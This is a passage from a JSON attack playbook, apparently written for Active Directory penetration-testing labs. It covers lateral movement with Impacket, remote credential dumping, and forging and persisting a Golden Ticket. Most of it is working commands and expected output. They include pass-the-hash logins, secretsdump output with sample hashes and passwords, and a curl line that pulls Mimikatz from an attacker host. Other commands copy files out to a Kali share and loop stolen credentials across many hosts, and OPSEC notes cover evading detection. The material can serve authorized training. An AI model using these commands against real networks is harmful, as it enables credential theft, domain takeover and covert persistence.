copy C:\\\\Users\\\\Administrator\\\\Desktop\\\\proof.txt \\\\\\\\<KALI_IP>\\\\share\\\\\n\nMethod 3: Base64 encode (no SMB connectivity):\nC:\\\\> certutil -encode C:\\\\sensitive.txt C:\\\\encoded.b64\nC:\\\\> type C:\\\\encoded.b64\n(Copy output to Kali, decode)\n\nUPGRADE TO SYSTEM PRIVILEGES (If needed):\n\nSwitch to PSExec for SYSTEM shell:\nexit (leave wmiexec)\n\nimpacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c 'corp.com/sqlsvc@10.10.10.100'\n\nC:\\\\> whoami\nnt authority\\\\system\n       ^^^^^^^^^^^^^^^^ SYSTEM privileges\n\nCREDENTIAL DUMPING FROM KALI:\n\nOption 1: Impacket secretsdump (remotely dump SAM/LSA/NTDS):\nimpacket-secretsdump 'corp.com/sqlsvc:SQLPass2023@10.10.10.100'\n\nOutput:\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:...\nGuest:501:aad3b435b51404eeaad3b435b51404ee:...\n\n[*] Dumping cached domain logon information (domain/username:hash)\ncorp.com/dave:$DCC2$10240#dave#...\ncorp.com/john:$DCC2$10240#john#...\n\n[*] Dumping LSA Secrets\n_SC_MSSQLSERVER:Password123ForSQL!\n<...service account passwords in cleartext...>\n\nOption 2: Upload Mimikatz via WMI (if needed):\nC:\\\\> curl http://<KALI_IP>:8000/mimikatz.exe -o C:\\\\Windows\\\\Temp\\\\m.exe\nC:\\\\> C:\\\\Windows\\\\Temp\\\\m.exe privilege::debug sekurlsa::logonpasswords exit\n\nMULTI-TARGET AUTOMATION:\n\nBatch access script:\n#!/bin/bash\nwhile read line; do\n  ip=$(echo $line | cut -d ',' -f 1)\n  user=$(echo $line | cut -d ',' -f 3)\n  pass=$(grep \"^$user:\" credentials.txt | cut -d ':' -f 2)\n  \n  echo \"[*] Accessing $ip as $user\"\n  impacket-wmiexec \"corp.com/$user:$pass@$ip\" \"whoami && hostname && ipconfig\" > recon_$ip.txt\ndone < access_matrix.csv\n\nKALI ADVANTAGES:\n\n- All tools local on Kali (no Windows VM needed)\n- No AV/EDR bypass (Mimikatz triggers every AV)\n- Impacket native SMB/RPC implementation (no dependencies)\n- Consistent Python toolchain (secretsdump, wmiexec, psexec, smbclient all Impacket)\n- Fast iteration (no RDP latency)\n\nOPSEC IMPACT:\n\n- WMI execution = EventID 4688 (Process Creation via wmiprvse.exe)\n- Less suspicious than PSExec service (no EventID 7045)\n- Network traffic identical to legitimate WMI admin tasks\n- Blue team detection: Unusual processes spawned by WMI Provider Host\n\nLIMITATIONS:\n\n- Semi-interactive shell (not fully interactive like SSH)\n- Some commands may not work (interactive prompts, GUI apps)\n- Output buffering (may not see real-time output)\n\nALTERNATIVES (If wmiexec fails):\n\n1. impacket-psexec (louder but more reliable, SYSTEM shell)\n2. impacket-smbexec (similar to psexec but no service file)\n3. impacket-atexec (scheduled task execution)\n4. impacket-dcomexec (DCOM-based execution)\n\nTIME ESTIMATE: 2-5 minutes per target (shell access and initial recon).",
      "command_ref": "ad-pass-the-hash-impacket-wmiexec",
      "evidence": [
        "WMI shell access established on target systems",
        "Basic reconnaissance completed (whoami, hostname, ipconfig)",
        "Sensitive files identified and exfiltrated",
        "Credentials harvested via secretsdump (SAM, LSA, cached)",
        "Proof.txt or local.txt retrieved from targets"
      ],
      "dependencies": [
        "validate-pth-crackmapexec"
      ],
      "repeatable": true,
      "success_criteria": [
        "Shell access obtained on at least one high-value target",
        "Commands execute successfully via WMI",
        "Files exfiltrated to Kali successfully",
        "Additional credentials discovered on target systems"
      ],
      "failure_conditions": [
        "Access denied despite Pwn3d! (policy restriction)",
        "WMI/DCOM disabled on target (service unavailable)",
        "Connection timeout (RPC/SMB ports blocked)",
        "Shell hangs (network instability)"
      ],
      "next_steps": [
        "create-golden-ticket-kali"
      ]
    },
    {
      "id": "create-golden-ticket-kali",
      "name": "Create and Validate Golden Ticket from Kali with Impacket Ticketer",
      "objective": "Forge persistent domain access using Impacket ticketer.py to create Golden Ticket entirely from Kali",
      "description": "IMPACKET TICKETER: Python-based Golden Ticket creation - functionally identical to Mimikatz kerberos::golden but runs on Kali.\n\nPREREQUISITES (From previous steps):\n- krbtgt NTLM hash (from DCSync)\n- Domain SID (from DCSync)\n- Domain FQDN (corp.com)\n\nRECALL EXTRACTED DATA:\n\necho \"krbtgt hash: $KRBTGT_HASH\"\necho \"Domain SID: $DOMAIN_SID\"\n\nIf variables not set:\nKRBTGT_HASH=$(grep 'krbtgt:' domain_dump.ntds | cut -d ':' -f 4)\nDOMAIN_SID=\"S-1-5-21-1234567890-1234567890-1234567890\"  # Replace with actual SID\n\nGOLDEN TICKET CREATION:\n\nimpacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain corp.com Administrator\n\nFull example:\nimpacket-ticketer -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.com Administrator\n\nOPTIONAL FLAGS (Advanced OPSEC):\n-duration <HOURS>: Ticket lifetime (default: 10 years). Use 10 for realism.\n-user-id <RID>: User RID (default: 500 = Administrator)\n-groups <RIDS>: Group memberships (default: 512,513,518,519,520 = all admin groups)\n\nRealistic OPSEC-aware ticket:\nimpacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain corp.com -duration 10 -user-id 500 Administrator\n\nOUTPUT:\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for corp.com/Administrator\n[*] Signing/Encrypting final ticket\n[*]   PAC_LOGON_INFO\n[*]   EncTicketPart\n[*] Saving ticket in Administrator.ccache\n          ^^^ OUTPUT FILE (Kerberos credential cache)\n\nVERIFY TICKET CREATED:\nls -lh Administrator.ccache\n\nExpected: File size 1-2 KB (valid ticket data)\n\nEXPORT TICKET TO ENVIRONMENT:\n\nexport KRB5CCNAME=$(pwd)/Administrator.ccache\n\nVerify:\necho $KRB5CCNAME\nOutput: /home/kali/Administrator.ccache (or current directory path)\n\nVIEW TICKET DETAILS:\n\nklist\n\nOutput:\nTicket cache: FILE:/home/kali/Administrator.ccache\nDefault principal: Administrator@CORP.COM\n\nValid starting       Expires              Service principal\n11/23/2025 10:00:00  11/23/2025 20:00:00  krbtgt/CORP.COM@CORP.COM\n^^^ Valid now        ^^^ 10 hours (realistic)  ^^^ TGT (Golden Ticket)\n\nVALIDATE GOLDEN TICKET ACCESS:\n\nTEST 1: DCSync with Golden Ticket (Domain Admin operation):\nimpacket-secretsdump -k -no-pass 'corp.com/Administrator@dc01.corp.com' -just-dc-user krbtgt\n\nFlags:\n-k: Use Kerberos authentication (reads ticket from KRB5CCNAME)\n-no-pass: No password prompt (using ticket auth)\n\nExpected:\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\n       ^^^ SUCCESS - Golden Ticket works for DCSync\n\nTEST 2: PSExec with Golden Ticket (SYSTEM shell on DC):\nimpacket-psexec -k -no-pass 'corp.com/Administrator@dc01.corp.com'\n\nExpected:\nC:\\\\Windows\\\\system32>\nwhoami\nnt authority\\\\system\n       ^^^^^^^^^^^^^^^^ SYSTEM on DC - Full domain control\n\nTEST 3: SMB share access with Golden Ticket:\nimpacket-smbclient -k -no-pass '//dc01.corp.com/SYSVOL'\n\nExpected:\nsmb: \\\\> ls\n  .                                   D        0  <date>\n  ..                                  D        0  <date>\n  corp.com                            D        0  <date>\n\nTEST 4: WMI execution with Golden Ticket:\nimpacket-wmiexec -k -no-pass 'corp.com/Administrator@dc01.corp.com'\n\nExpected:\nC:\\\\>\nwhoami\ncorp\\\\administrator\n\nDOMAIN-WIDE ACCESS VALIDATION:\n\nTest against multiple targets:\nfor target in dc01.corp.com sql01.corp.com web01.corp.com; do\n  echo \"[*] Testing Golden Ticket against $target\"\n  impacket-wmiexec -k -no-pass \"corp.com/Administrator@$target\" \"whoami && hostname\"\ndone\n\nExpected: Access to ALL domain-joined systems.\n\nPERSISTENCE DOCUMENTATION:\n\nCreate backup and re-access instructions:\n\nSAVE GOLDEN TICKET COMPONENTS:\ncat > golden_ticket_info.txt << EOF\n=== Golden Ticket Persistence ===\nDomain: corp.com\nDomain SID: $DOMAIN_SID\nkrbtgt NTLM hash: $KRBTGT_HASH\n\nTicket file: Administrator.ccache\nCreated: $(date)\nExpiration: 10 hours from creation\n\nRe-creation command:\nimpacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain corp.com -duration 10 Administrator\n\nUsage:\nexport KRB5CCNAME=/path/to/Administrator.ccache\nimpacket-psexec -k -no-pass 'corp.com/Administrator@dc01.corp.com'\nEOF\n\nBACKUP TICKET:\nmkdir -p ~/loot/golden_tickets\ncp Administrator.ccache ~/loot/golden_tickets/corp_Administrator_$(date +%Y%m%d).ccache\ncp golden_ticket_info.txt ~/loot/golden_tickets/\n\nRE-ACCESS PROCEDURE (Future use):\n\n1. Regenerate ticket (if expired):\nimpacket-ticketer -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-... -domain corp.com Administrator\n\n2. Export:\nexport KRB5CCNAME=Administrator.ccache\n\n3. Verify:\nklist\n\n4. Use:\nimpacket-psexec -k -no-pass 'corp.com/Administrator@dc01.corp.com'\n\nKALI-SPECIFIC KERBEROS NOTES:\n\nKerberos cache location:\n- Default: /tmp/krb5cc_<UID>\n- Custom: Specified via KRB5CCNAME\n- Persistent: Copy .ccache file to permanent location\n\nMultiple tickets:\n- Can maintain multiple .ccache files for different users\n- Switch: export KRB5CCNAME=/path/to/different.ccache\n\nKerberos configuration:\n- Uses /etc/krb5.conf (configured in step 1)\n- Must have correct realm and KDC settings\n\nTROUBLESHOOTING:\n\nError: \"KDC_ERR_TGT_REVOKED\":\n- krbtgt password changed (ticket invalidated)\n- Solution: Re-compromise, extract new krbtgt hash, regenerate ticket\n\nError: \"KRB_AP_ERR_SKEW\":\n- Time sync issue\n- Solution: sudo ntpdate dc01.corp.com\n\nError: \"Cannot resolve KDC\":\n- DNS issue\n- Solution: Check /etc/resolv.conf points to DC\n\nError: \"Ticket expired\":\n- Ticket past expiration time\n- Solution: Regenerate with ticketer.py\n\nADVANTAGES OF KALI WORKFLOW:\n\n- No Windows VM needed (save resources)\n- No AV bypass required (ticketer.py on Kali, not Mimikatz on Windows)\n- Persistent storage (save .ccache files indefinitely)\n- Automation-friendly (scripted ticket creation and usage)\n- No file transfers (everything on Kali)\n\nOPSEC CONSIDERATIONS:\n\n- Golden Ticket creation: Zero network traffic (local operation on Kali)\n- Golden Ticket usage: No AS-REQ to KDC (no authentication event)\n- Detection: Abnormal TGS-REQ patterns, unusual ticket lifetimes, tickets for disabled accounts\n- Blue team indicators: TGT with 10-year lifetime, tickets from non-standard sources\n\nTIME ESTIMATE: 5-10 minutes (ticket creation, export, validation).",
      "command_ref": "ad-golden-ticket-ticketer-create",
      "evidence": [
        "Administrator.ccache file created successfully",
        "KRB5CCNAME environment variable set",
        "klist shows valid Golden Ticket",
        "Domain Controller access confirmed via psexec/wmiexec",
        "DCSync works with Golden Ticket (domain-wide access validated)",
        "golden_ticket_info.txt documented for persistence"
      ],
      "dependencies": [
        "lateral-movement-impacket"
      ],
      "repeatable": true,
      "success_criteria": [
        "Golden Ticket created successfully (Administrator.ccache exists)",
        "Ticket loads into Kerberos cache (klist shows ticket)",
        "Domain Controller accessible with ticket (psexec/wmiexec works)",
        "DCSync operation succeeds with ticket (Domain Admin privileges confirmed)",
        "Persistence components documented and backed up"
      ],
      "failure_conditions": [
        "ticketer.py fails (invalid hash or SID format)",
        "KDC_ERR_TGT_REVOKED (krbtgt password changed - ticket invalidated)",
        "KRB_AP_ERR_SKEW (time sync issue)",
        "Cannot resolve DC FQDN (DNS configuration issue)",
        "Ticket created but authentication fails (Kerberos config issue)"
      ],
      "next_steps": []
    }
  ]
}